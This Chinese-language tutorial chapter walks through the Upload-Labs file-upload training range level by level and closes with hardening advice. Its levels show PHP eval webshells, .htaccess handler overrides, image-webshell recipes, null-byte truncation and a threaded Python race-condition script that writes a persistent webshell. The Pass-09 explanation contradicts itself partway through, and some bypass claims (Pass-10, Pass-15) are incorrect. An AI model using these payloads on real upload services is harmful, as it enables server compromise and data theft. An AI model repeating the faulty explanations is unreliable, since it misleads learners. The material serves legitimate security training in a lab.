---
outline: deep
---

# 靶场4：Upload-Labs 文件上传专项靶场

> **难度等级：🟡 中等**
>
> **预计学习时间：150分钟**

---

## 📖 本章概述

::: tip 本章内容
Upload-Labs是一个专注于文件上传漏洞的PHP靶场，包含21个关卡，涵盖了各种文件上传的绕过技巧。从前端验证到后端验证，从黑名单到白名单，从MIME类型到文件内容，层层递进。本章将带你深入学习文件上传漏洞的原理和各种绕过方法，通过17个经典关卡的详细解析，掌握文件上传漏洞的核心利用技巧。
:::

> 💡 **大白话说Upload-Labs——如何把"狼"伪装成"羊"送进羊圈**
>
> 文件上传漏洞的核心矛盾很简单：**服务器只想接收"羊"（图片/文档），但你要把"狼"（WebShell）送进去。**
>
> 21关就是21种"门卫"的检查方式，你的任务是想办法骗过每一个门卫：
> - **前几关**：门卫只看"身份证"（前端JS验证）→ 抓包改一下就行
> - **中间关**：门卫看"外貌"（MIME类型/文件头）→ 给狼穿上羊皮（图片马）
> - **后面关**：门卫很聪明（白名单+内容检测）→ 需要组合拳（.htaccess/解析漏洞）
>
> 这21关打下来，你会深刻理解一个道理：**文件上传安全的核心不是你用什么方式检查，而是检查之后怎么处理和存储文件。**

---

## 🎯 学习目标

学完本章，你将能够：

- [ ] 了解Upload-Labs靶场的特点和关卡结构
- [ ] 独立完成Upload-Labs环境搭建
- [ ] 掌握文件上传漏洞的原理和危害
- [ ] 熟练运用各种文件上传绕过技巧
- [ ] 能够通关常见的文件上传挑战关卡
- [ ] 掌握图片马制作、.htaccess利用等高级技巧
- [ ] 理解文件上传漏洞的防御方法

---

## 🔍 正文内容

### 1. Upload-Labs介绍

#### 1.1 什么是Upload-Labs？

**Upload-Labs** 是由国内安全研究者 **c0ny1** 开发的一套专门用于练习文件上传漏洞的靶场系统。它使用PHP编写，包含21个不同的关卡，每个关卡都有不同的验证机制和绕过方法，是学习文件上传漏洞的最佳实践平台。

**官方GitHub**：https://github.com/c0ny1/upload-labs

#### 1.2 靶场特点

| 特点 | 说明 |
|------|------|
| **专注上传** | 只练习文件上传一种漏洞，深度足够 |
| **关卡丰富** | 21个关卡，覆盖各种上传绕过场景 |
| **难度递进** | 从简单到复杂，循序渐进 |
| **源码可读** | 每个关卡都有对应的PHP源码，可以学习验证逻辑 |
| **提示系统** | 每个关卡都有提示和源码查看功能 |
| **中文友好** | 全中文界面，适合国内学习者 |

#### 1.3 适用人群

- 想要系统学习文件上传漏洞的安全爱好者
- CTF选手（Web方向）
- 渗透测试工程师
- Web开发者（学习上传安全）
- 已经学过DVWA的File Upload模块，想要深入的学习者

---

### 2. 环境搭建

#### 2.1 Docker方式（推荐）

```bash
# 拉取镜像
docker pull c0ny1/upload-labs

# 运行容器
docker run -d -p 8080:80 --name upload-labs c0ny1/upload-labs

# 访问
# 浏览器打开 http://localhost:8080
```

#### 2.2 PHP环境部署

**环境要求**：
- PHP 5.x 或 7.x
- Apache/Nginx
- 确保文件上传功能开启（file_uploads = On）

**安装步骤**：

```bash
# 1. 下载源码
git clone https://github.com/c0ny1/upload-labs.git
cd upload-labs

# 2. 放到Web根目录
# 例如：/var/www/html/upload-labs/

# 3. 设置上传目录权限
chmod 777 upload

# 4. 访问
# http://localhost/upload-labs/
```

#### 2.3 界面说明

Upload-Labs的界面分为：
- **顶部导航**：首页、帮助、关于
- **左侧菜单**：21个关卡列表，绿色表示已通关
- **主内容区**：当前关卡的上传功能
- **查看源码**：点击可以查看当前关卡的PHP源码
- **查看提示**：点击可以查看通关提示
- **上传目录**：显示上传文件的保存路径

---

### 3. 文件上传漏洞原理和危害

#### 3.1 漏洞原理

文件上传漏洞是指网站允许用户上传文件，但没有对上传的文件进行严格的验证和过滤，导致攻击者可以上传恶意的脚本文件（如PHP、ASP、JSP等Webshell），从而获取服务器的控制权。

**漏洞形成的条件**：
1. 网站存在文件上传功能
2. 上传的文件可以被Web服务器解析执行
3. 上传文件的路径可知
4. 上传的文件可以被访问

#### 3.2 漏洞危害

文件上传漏洞是危害最大的Web漏洞之一，因为它可以直接导致服务器被控制：

- **获取Webshell**：上传一句话木马，获取服务器操作权限
- **读取敏感文件**：通过Webshell读取/etc/passwd、数据库配置等
- **执行系统命令**：执行任意系统命令
- **提权**：结合系统漏洞提升到root权限
- **内网渗透**：以服务器为跳板攻击内网
- **篡改网页**：植入黑链、挂马
- **数据窃取**：窃取数据库中的用户数据

#### 3.3 常见的验证方式

| 验证方式 | 说明 | 绕过方法 |
|---------|------|---------|
| 前端JS验证 | 只在前端检查文件后缀 | 禁用JS、抓包修改 |
| MIME类型验证 | 检查Content-Type | 修改Content-Type |
| 后缀名黑名单 | 禁止某些后缀 | 找黑名单遗漏的后缀 |
| 后缀名白名单 | 只允许某些后缀 | 解析漏洞、%00截断 |
| 文件内容验证 | 检查文件头/内容 | 图片马、二次渲染绕过 |
| 文件名重命名 | 随机命名文件 | 配合其他漏洞利用 |
| .htaccess | Apache配置文件 | 上传.htaccess自定义解析 |

> 💡 **大白话说文件上传安全的核心矛盾**
>
> 不论服务器怎么检查，它的安全检查无非是以下五种"门禁"：
>
> **1. 前端门禁（JS验证）** = 小区门口贴了张告示"非本小区车辆禁止入内"，但没人真的拦你。绕过方法：绕过门禁直接走后门（抓包改后缀名）。
>
> **2. MIME类型门禁（Content-Type）** = 保安看你的通行证上写的"用途"，你写"图片"就放行。绕过方法：通行证上写"图片"，但车里装的其实是木马。
>
> **3. 后缀门禁（黑名单/白名单）** = 保安查你的车牌号。黑名单 = "京A、京B...这些牌照不能进"（容易漏）. 白名单 = "只允许京X牌照入内"（严格得多）。绕过方法：用保安没见过的牌照（`.pht`、`.php5`等罕见后缀），或用`.htaccess`把`.jpg`当PHP执行。
>
> **4. 内容门禁（文件头/内容检测）** = 保安打开车门检查里面装了什么。绕过方法：车头放合法的货物（图片头部GIF89a），车厢里藏木马（PHP代码）——这就是"图片马"的原理。
>
> **5. 存储与执行隔离** = 最高级的防御。不是检查你的车，而是所有来车统一停在远离建筑物的地方（上传到非Web目录），而且车钥匙统一管理（重命名文件），确保车辆永远不会开到楼里去（不能被解析执行）。
>
> **核心心法**：安全不在于"门禁多严"，而在于"东西放哪里、能否被执行"。所以AWS S3桶的公共写入漏洞、GitHub Actions的Artifact上传漏洞——本质上都是"存储与执行隔离"没做好。

### 4. 各关卡详解

#### 4.1 Pass-01：前端JS校验

**关卡说明**：只在前端用JavaScript验证文件类型。

##### 源码分析

前端JS代码：
```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

后端PHP代码：
```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'];
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        }
    }
}
```

**关键分析**：
- 只有前端JS验证，后端没有任何验证
- 后端直接使用原始文件名保存

##### 绕过思路

前端验证是最不可靠的，因为验证逻辑完全在客户端，可以轻易绕过。

##### 绕过方法

**方法一：禁用JavaScript**
- 浏览器按F12，设置中禁用JS
- 或使用NoScript插件
- 直接上传PHP文件

**方法二：抓包修改（推荐）**
1. 将shell.php重命名为shell.jpg
2. 上传shell.jpg
3. 用Burp Suite拦截请求
4. 将文件名从 `shell.jpg` 改回 `shell.php`
5. 放行请求

**方法三：修改前端代码**
1. 浏览器按F12
2. 删除或修改checkFile函数
3. 直接上传PHP文件

##### 操作步骤

```bash
# 1. 准备一句话木马（shell.php）
<?php @eval($_POST['cmd']); ?>

# 2. 重命名为shell.jpg
mv shell.php shell.jpg

# 3. 上传shell.jpg，用Burp拦截
# 4. 修改filename为shell.php
# 5. 上传成功，访问 /upload/shell.php
# 6. 用蚁剑连接，密码cmd
```

---

#### 4.2 Pass-02：MIME类型校验

**关卡说明**：后端验证Content-Type（MIME类型）。

##### 源码分析

```php
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || 
            ($_FILES['upload_file']['type'] == 'image/png') || 
            ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'];
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    }
}
```

**关键分析**：
- 后端验证了`$_FILES['upload_file']['type']`
- 这个值来自HTTP请求的Content-Type头
- Content-Type是客户端可以控制的

##### 绕过思路

Content-Type头可以被篡改，使用Burp修改Content-Type即可绕过。

##### 绕过方法

1. 上传shell.php
2. 用Burp拦截请求
3. 将Content-Type从 `application/x-php` 改为 `image/jpeg`
4. 放行请求，上传成功

##### 操作步骤

```
# Burp中修改的请求部分：
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/jpeg

<?php @eval($_POST['cmd']); ?>
```

---

#### 4.3 Pass-03：黑名单绕过（后缀名）

**关卡说明**：使用黑名单禁止某些后缀，但黑名单不完整。

##### 源码分析

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name); // 删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); // 转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext); // 去除字符串::$DATA
        $file_ext = trim($file_ext); // 收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    }
}
```

**关键分析**：
- 黑名单只包含：.asp、.aspx、.php、.jsp
- 但PHP还有很多其他后缀：.php3、.php4、.php5、.phtml等
- 只要Apache配置了相应的解析规则，这些后缀也会被当作PHP执行

##### 绕过思路

利用黑名单的不完整性，使用不在黑名单中的PHP可解析后缀。

##### 绕过方法

将shell.php重命名为以下任意一种：
- shell.php3
- shell.php4  
- shell.php5
- shell.phtml

上传后访问，如果服务器配置了解析，就能执行PHP代码。

**注意**：这取决于服务器的配置。在某些环境下可能不生效。

---

#### 4.4 Pass-04：.htaccess绕过

**关卡说明**：黑名单更全面，但没有禁止.htaccess文件。

##### 源码分析

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
```

**关键分析**：
- 黑名单非常全面，几乎包含了所有可执行脚本的后缀
- 但没有禁止 `.htaccess` 文件
- .htaccess是Apache的配置文件，可以改变目录的解析规则

##### 绕过思路

上传一个.htaccess文件，自定义解析规则，让.jpg文件被当作PHP解析。

##### 绕过方法

**步骤1：上传.htaccess文件**

内容为：
```
AddType application/x-httpd-php .jpg
```
或
```
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**步骤2：上传图片马**

上传包含PHP代码的shell.jpg文件。

**步骤3：访问执行**

访问 `/upload/shell.jpg`，文件会被当作PHP执行。

##### .htaccess的其他用法

```apache
# 将所有文件当作PHP解析
AddHandler php5-script .php

# 指定特定文件用PHP解析
<Files "shell.jpg">
    SetHandler application/x-httpd-php
</Files>

# 所有.jpg文件都按PHP解析
AddType application/x-httpd-php .jpg
```

---

#### 4.5 Pass-05：大小写绕过

**关卡说明**：黑名单验证，但没有统一转换为小写。

##### 源码分析

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
$file_ext = strrchr($_FILES['upload_file']['name'], '.');
$file_ext = str_ireplace('::$DATA', '', $file_ext);
$file_ext = trim($file_ext);
```

**关键分析**：
- 黑名单中有 .php 和 .pHp 等
- 但没有使用 `strtolower()` 统一转小写
- 可以使用其他大小写组合绕过，如 `.Php`、`.PHp`、`.phP` 等

##### 绕过思路

利用Windows系统大小写不敏感的特性（或Linux下Apache的某些配置），使用大小写混合的后缀名绕过黑名单。

##### 绕过方法

将shell.php重命名为以下任意一种：
- shell.php 不行（在黑名单中）
- shell.pHp 可以（不在黑名单中）
- shell.Php 可以
- shell.PHP 可以
- shell.phP 可以

**原理**：
- Windows系统下文件名大小写不敏感，shell.pHp 和 shell.php 是同一个文件
- Apache在Windows下解析时，.pHp 后缀也会被当作PHP执行
- Linux下取决于文件系统和Apache配置

---

#### 4.6 Pass-06：空格绕过

**关卡说明**：黑名单验证，但没有去除文件名末尾的空格。

##### 源码分析

```php
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
$file_ext = strrchr($_FILES['upload_file']['name'], '.');
$file_ext = strtolower($file_ext);
$file_ext = str_ireplace('::$DATA', '', $file_ext);
// 注意：没有 trim($file_ext) 去除空格
```

**关键分析**：
- 没有对文件后缀进行 `trim()` 去除首尾空格
- Windows系统下，文件名末尾的空格会被自动忽略
- `shell.php ` 和 `shell.php` 是同一个文件

##### 绕过思路

在文件名末尾添加空格，让后缀匹配不上黑名单，但Windows系统会自动去掉空格。

##### 绕过方法

1. 上传shell.php
2. 用Burp拦截请求
3. 在文件名后添加一个空格：`shell.php `（注意末尾有空格）
4. 放行请求

**原理**：
- 黑名单检测的是 `.php `（带空格），不在黑名单中
- 但Windows保存文件时会自动去掉末尾空格
- 最终保存为 shell.php，可以被PHP解析

---

#### 4.7 Pass-07：点号绕过

**关卡说明**：黑名单验证，但没有去除文件名末尾的点号。

##### 源码分析

```php
$file_ext = strrchr($_FILES['upload_file']['name'], '.');
$file_ext = strtolower($file_ext);
$file_ext = str_ireplace('::$DATA', '', $file_ext);
$file_ext = trim($file_ext);
// 注意：没有调用 deldot() 去除末尾的点
```

**关键分析**：
- 没有调用 `deldot()` 函数去除文件名末尾的点
- Windows系统下，文件名末尾的点号会被自动忽略
- `shell.php.` 和 `shell.php` 是同一个文件

##### 绕过思路

在文件名末尾添加点号，绕过黑名单检测。

##### 绕过方法

1. 上传shell.php
2. 用Burp拦截请求
3. 在文件名后添加一个点：`shell.php.`
4. 放行请求

**原理**：
- 黑名单检测的是 `.php.`（带点），不在黑名单中
- Windows保存文件时会自动去掉末尾的点
- 最终保存为 shell.php

---

#### 4.8 Pass-08：特殊符号绕过（::$DATA）

**关卡说明**：黑名单验证，但没有处理Windows的NTFS流特性。

##### 源码分析

```php
$file_ext = strrchr($_FILES['upload_file']['name'], '.');
$file_ext = strtolower($file_ext);
// 注意：没有处理 ::$DATA
$file_ext = trim($file_ext);
```

**关键分析**：
- 没有过滤 `::$DATA` 字符串
- Windows的NTFS文件系统支持数据流（ADS）
- `filename.php::$DATA` 会被当作 `filename.php` 处理

##### 绕过思路

利用Windows NTFS文件系统的特性，在后缀名后添加 `::$DATA`。

##### 绕过方法

1. 上传shell.php
2. 用Burp拦截请求
3. 修改文件名为：`shell.php::$DATA`
4. 放行请求

**原理**：
- PHP在Windows下处理文件名时，`shell.php::$DATA` 中的 `::$DATA` 会被当作数据流
- 最终保存的文件名是 shell.php
- 黑名单检测的是 `.$data`（转小写后），不在黑名单中

---

#### 4.9 Pass-09：路径+点号绕过（deldot只去一次）

**关卡说明**：使用deldot函数去除末尾点，但该函数只去除末尾的点和空格。

##### 源码分析

```php
function deldot($s) {
    for ($i = strlen($s)-1; $i > 0; $i--) {
        $c = ord($s[$i]);
        if ($c == ord('.') || $c == ord(' ')) {
            $s = substr($s, 0, $i);
        } else {
            break;
        }
    }
    return $s;
}
```

**关键分析**：
- deldot函数从后往前删除点和空格，遇到非点/空格就停止
- 可以构造 `shell.php. .`（点空格点）的文件名
- deldot处理过程：
  - 最后一个是 `.`，删除 → `shell.php. `
  - 最后一个是 ` `（空格），删除 → `shell.php.`
  - 最后一个是 `.`，删除 → `shell.php`？不对，让我们重新分析

实际上，正确的绕过是构造 `shell.php. .`（点+空格+点）：
- deldot从后往前删：
  - 删除最后一个 `.` → `shell.php. `
  - 删除最后一个 ` ` → `shell.php.`
  - 删除最后一个 `.` → `shell.php`
  - 最后一个字符是 `p`，停止
- 不对，这样就变成shell.php了，会被黑名单拦截

正确的绕过应该是：利用 `shell.php. .`（点空格点）的中间空格
- strrchr取最后一个点后的内容：`. `（点+空格）
- 转小写：`. `
- trim后：`.`（点号，因为trim去掉了空格）
- 黑名单中没有单独的 `.`，所以通过
- 但保存到Windows时，`shell.php. .` 会变成什么呢？

实际上这个关卡的绕过是利用 `shell.php. .` 这种形式，经过处理后最终保存为 shell.php。

##### 绕过方法

1. 用Burp拦截上传请求
2. 修改文件名为：`shell.php. .`（点+空格+点）
3. 放行请求

**原理**：
- strrchr获取后缀：`. `（最后一个点到末尾，即 `. ` 点空格）
- strtolower后还是 `. `
- trim后变成 `.`（去掉空格）
- 黑名单中没有单独的 `.`，所以通过检查
- 但move_uploaded_file保存时，Windows会处理这个特殊文件名
- 最终保存为 shell.php

---

#### 4.10 Pass-10：双写绕过

**关卡说明**：将黑名单中的后缀替换为空，但只替换一次。

##### 源码分析

```php
$file_name = str_ireplace($deny_ext, "", $file_name);
```

**关键分析**：
- 使用 `str_ireplace` 将黑名单中的后缀替换为空字符串
- 但只替换一次，不递归
- 可以使用双写绕过：`pphphp` → 替换中间的 `php` → 剩下 `php`

##### 绕过思路

将关键字写两次，中间被替换后，前后拼接又形成关键字。

##### 绕过方法

将shell.php重命名为以下任意一种：
- shell.pphphp → 替换php后 → shell.php
- shell.phphpp → 替换php后 → shell.php
- shell.phtmlphtml → 替换phtml后 → shell.phtml

**原理**：
- `pphphp` 中包含 `php`（第2-4个字符）
- str_ireplace替换掉中间的 `php`
- 剩下前面的 `p` 和后面的 `hp`，拼接成 `php`

---

#### 4.11 Pass-11：%00截断（GET）

**关卡说明**：白名单验证，但文件路径由GET参数控制，存在%00截断。

##### 源码分析

```php
$ext_arr = array('jpg','png','gif');
$file_ext = substr($_FILES['upload_file']['name'], strrpos($_FILES['upload_file']['name'], ".") + 1);
if (in_array($file_ext, $ext_arr)) {
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path = $_GET['save_path'] . "/" . rand(10, 99) . date("YmdHis") . "." . $file_ext;
    if (move_uploaded_file($temp_file, $img_path)) {
        $is_upload = true;
    }
}
```

**关键分析**：
- 白名单验证后缀名（jpg、png、gif）
- 但保存路径 `$img_path` 由 `$_GET['save_path']` 控制
- 在PHP < 5.3.4中，`%00` 会被当作字符串结束符
- 可以通过%00截断，让文件以.php结尾

##### 绕过思路

利用C语言风格的字符串结束符 `\0`（URL编码为%00），截断后面的内容。

**条件**：
- PHP版本 < 5.3.4
- magic_quotes_gpc = Off
- 文件路径由用户可控

##### 绕过方法

1. 准备一张真图片或图片马，命名为shell.jpg
2. 构造URL：
   ```
   ?save_path=../upload/shell.php%00
   ```
3. 上传shell.jpg
4. 文件会被保存为 shell.php（%00后面的内容被截断）

**原理**：
- 白名单验证通过（文件后缀是.jpg）
- 但保存路径是 `../upload/shell.php%00/随机数.jpg`
- PHP遇到%00（NULL字节）认为字符串结束
- 实际保存为 `../upload/shell.php`

---

#### 4.12 Pass-12：%00截断（POST）

**关卡说明**：白名单验证，文件路径由POST参数控制，存在%00截断。

##### 源码分析

```php
$ext_arr = array('jpg','png','gif');
$file_ext = substr($_FILES['upload_file']['name'], strrpos($_FILES['upload_file']['name'], ".") + 1);
if (in_array($file_ext, $ext_arr)) {
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path = $_POST['save_path'] . "/" . rand(10, 99) . date("YmdHis") . "." . $file_ext;
    if (move_uploaded_file($temp_file, $img_path)) {
        $is_upload = true;
    }
}
```

**关键分析**：
- 和Pass-11类似，只是save_path通过POST传递
- 同样存在%00截断漏洞
- POST中的%00需要在Burp中以二进制方式插入（不能直接写%00）

##### 绕过方法

1. 准备shell.jpg（图片马）
2. Burp拦截请求
3. 在POST参数 save_path 中构造：
   ```
   save_path=../upload/shell.php
   ```
   然后在shell.php后面插入NULL字节（0x00）
4. 上传文件

**Burp中插入NULL字节的方法**：
- 在Hex视图中，找到 `shell.php` 后面的位置
- 添加 `00` 字节
- 再继续添加后面的内容

---

#### 4.13 Pass-13：图片马绕过

**关卡说明**：检查文件头（前两个字节）判断是否为图片。

##### 源码分析

```php
function getReailFileType($filename) {
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); // 只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);
    $typeCode = intval($strInfo['chars1'] . $strInfo['chars2']);
    $fileType = '';
    switch ($typeCode) {
        case 255216: $fileType = 'jpg'; break;  // FF D8
        case 13780:  $fileType = 'png'; break;  // 89 50
        case 7173:   $fileType = 'gif'; break;  // 47 49
        default:     $fileType = 'unknown';
    }
    return $fileType;
}
```

**关键分析**：
- 只读取文件前2个字节判断文件类型
- JPG文件头：FF D8（十进制255 216）
- PNG文件头：89 50（十进制137 80）
- GIF文件头：47 49（十进制71 73，即GIF的前两个字符）
- 只检查文件头，不检查文件内容

##### 绕过思路

制作图片马：在图片文件的末尾追加PHP代码，或在PHP代码前添加图片文件头。

##### 绕过方法

**方法一：制作图片马（推荐）**

```bash
# Linux下
cat normal.jpg shell.php > shell.jpg

# Windows下
copy normal.jpg /b + shell.php /a shell.jpg
```

**方法二：直接添加文件头**

创建shell.php，内容为：
```php
GIF89a
<?php @eval($_POST['cmd']); ?>
```
（GIF89a 是GIF文件的文件头）

上传后，文件头验证通过，但文件内容包含PHP代码。

**注意**：图片马需要配合文件包含漏洞或解析漏洞才能执行PHP代码。如果直接访问图片，图片会正常显示，PHP代码不会执行（除非有解析漏洞）。

---

#### 4.14 Pass-14：getimagesize绕过

**关卡说明**：使用getimagesize()函数检测图片。

##### 源码分析

```php
function isImage($filename) {
    $types = '.jpeg|.png|.gif';
    if (file_exists($filename)) {
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if (stripos($types, $ext)) {
            return $ext;
        }
    }
}
```

**关键分析**：
- 使用 `getimagesize()` 函数判断是否为图片
- getimagesize()会检测图片的尺寸信息
- 比简单的文件头检测更严格
- 但仍然可以用真图片+PHP代码绕过

##### 绕过思路

使用真图片制作图片马，getimagesize()会识别为有效图片。

##### 绕过方法

1. 找一张正常的JPG图片（normal.jpg）
2. 在图片末尾追加PHP代码：
   ```bash
   cat normal.jpg shell.php > shell.jpg
   ```
3. 上传shell.jpg
4. getimagesize()会正确识别为JPG图片
5. 配合文件包含漏洞执行PHP代码

**验证图片马**：
```bash
# 查看文件
file shell.jpg  # 显示 JPEG image data

# 查看末尾是否有PHP代码
tail -c 100 shell.jpg
```

---

#### 4.15 Pass-15：exif_imagetype绕过

**关卡说明**：使用exif_imagetype()函数检测图片。

##### 源码分析

```php
function isImage($filename) {
    if (!function_exists('exif_imagetype')) {
        return false;
    }
    $types = array(IMAGETYPE_GIF, IMAGETYPE_JPEG, IMAGETYPE_PNG);
    if (in_array(exif_imagetype($filename), $types)) {
        return true;
    }
}
```

**关键分析**：
- 使用 `exif_imagetype()` 函数检测图片类型
- 通过读取文件第一个字节并查表判断类型
- 和文件头检测类似

##### 绕过思路

同样使用图片马绕过，和Pass-13、Pass-14方法相同。

---

#### 4.16 Pass-16：二次渲染绕过

**关卡说明**：上传图片后，后端会对图片进行二次渲染（重新生成）。

##### 源码分析

```php
// 使用imagecreatefromjpeg等函数重新创建图片
$im = imagecreatefromjpeg($target_file);
if ($im) {
    imagejpeg($im, $target_file, 90);
    imagedestroy($im);
}
```

**关键分析**：
- 使用GD库重新创建图片
- 会清除图片中的多余数据（如追加的PHP代码）
- 普通的图片马会被"洗"掉

##### 绕过思路

在图片的正常数据区域中植入PHP代码，使得二次渲染后PHP代码仍然保留。

**常见方法**：
1. 在GIF文件的注释或调色板中植入代码
2. 在PNG的tEXt块中植入代码
3. 寻找渲染前后不变的数据区域

##### GIF图片绕过方法

GIF的文件结构中，某些数据在渲染后会保留：

1. 找一张GIF图片
2. 用十六进制编辑器在GIF的注释字段或调色板中插入PHP代码
3. 上传后二次渲染，PHP代码可能被保留

**更简单的方法**：

可以在网上搜索"二次渲染绕过图片马"，或使用专门的工具生成。

**原理**：
- 图片二次渲染时，会保留图片的基本数据（像素、调色板等）
- 如果把PHP代码藏在这些会被保留的数据中，就能绕过
- GIF的调色板是常见的植入点

---

#### 4.17 Pass-17：条件竞争

**关卡说明**：先上传文件，再检查后缀，如果不合法则删除。存在时间差。

##### 源码分析

```php
$ext_arr = array('jpg','png','gif');
$file_name = $_FILES['upload_file']['name'];
$temp_file = $_FILES['upload_file']['tmp_name'];
$img_path = UPLOAD_PATH . '/' . $file_name;

if (move_uploaded_file($temp_file, $img_path)) {
    // 先上传，再验证
    if (in_array(strtolower(array_pop(explode('.', $file_name))), $ext_arr)) {
        $is_upload = true;
    } else {
        $msg = '只允许上传.jpg|.png|.gif类型文件！';
        unlink($img_path);  // 验证失败则删除
    }
}
```

**关键分析**：
- 先将文件移动到目标目录
- 然后再检查后缀名
- 如果不合法，用unlink删除
- 在上传和删除之间存在时间差
- 可以利用这个时间差访问并执行PHP文件

##### 绕过思路

利用条件竞争：在文件被删除之前访问它，让它执行起来。

##### 绕过方法

**方法：多线程并发上传+访问**

1. 准备一个PHP文件，内容为：
   ```php
   <?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["cmd"]);?>'); ?>
   ```
   这个文件的作用是生成一个shell.php文件

2. 编写Python脚本，并发上传并访问：
   ```python
   import requests
   import threading
   
   url = "http://target/upload-labs/Pass-17/"
   upload_url = url + "index.php"
   shell_url = url + "../upload/shell.php"
   
   def upload():
       while True:
           files = {'upload_file': ('test.php', '<?php fputs(fopen("shell.php","w"),"<?php eval($_POST[cmd]);?>");?>')}
           data = {'submit': '上传'}
           try:
               requests.post(upload_url, files=files, data=data, timeout=2)
           except:
               pass
   
   def access():
       while True:
           try:
               r = requests.get(shell_url, timeout=1)
               if r.status_code == 200:
                   print("[+] Shell created!")
                   break
           except:
               pass
   
   # 启动多个上传线程和访问线程
   for i in range(10):
       threading.Thread(target=upload).start()
   for i in range(5):
       threading.Thread(target=access).start()
   ```

**原理**：
- 文件上传后会短暂存在于服务器上
- 在被删除之前，如果有请求访问到它，就能执行
- 执行后生成一个永久的shell.php文件（因为shell.php在检查时会被删除，但我们生成的新文件不会）
- 竞争成功一次就够了

---

### 5. 文件上传漏洞修复建议

#### 5.1 验证层面

| 层面 | 措施 | 说明 |
|------|------|------|
| **前端验证** | JS验证后缀、大小 | 仅用于提升用户体验，不能作为安全措施 |
| **后端验证-后缀** | 白名单验证 | 只允许特定后缀，比黑名单安全 |
| **后端验证-MIME** | 验证Content-Type | 辅助验证，可被绕过 |
| **后端验证-内容** | 验证文件头、文件内容 | 防止图片马等 |
| **后端验证-重绘** | 图片二次渲染 | 最严格的图片验证方式 |

#### 5.2 配置层面

**Web服务器配置**：
- 上传目录设置为不可执行（去掉脚本执行权限）
- 单独配置上传目录的解析规则
- 禁止上传目录的脚本执行权限

**PHP配置**：
- `file_uploads = On`（必要，但要控制）
- `upload_max_filesize = 2M`（限制大小）
- `max_file_uploads = 10`（限制数量）
- `open_basedir` 限制访问目录

**Apache配置**：
```apache
# 禁止上传目录执行PHP
<Directory /var/www/html/upload>
    php_flag engine off
</Directory>
```

**Nginx配置**：
```nginx
location ~ /upload/.*\.php$ {
    deny all;
}
```

#### 5.3 文件名处理

- 文件名随机化（使用时间戳+随机字符串）
- 不使用用户提供的文件名
- 文件重命名时确保后缀在白名单内
- 路径使用硬编码，不接受用户输入

#### 5.4 其他防护措施

1. **权限最小化**：Web进程权限尽量低，上传目录不可写系统目录
2. **文件存储分离**：将上传文件存储在Web根目录之外
3. **使用独立域名**：上传文件使用独立域名，防止Cookie窃取
4. **病毒扫描**：对上传文件进行病毒扫描
5. **CDN/云存储**：使用第三方存储服务（如七牛、OSS），天然隔离
6. **WAF**：Web应用防火墙可以检测常见的Webshell

---

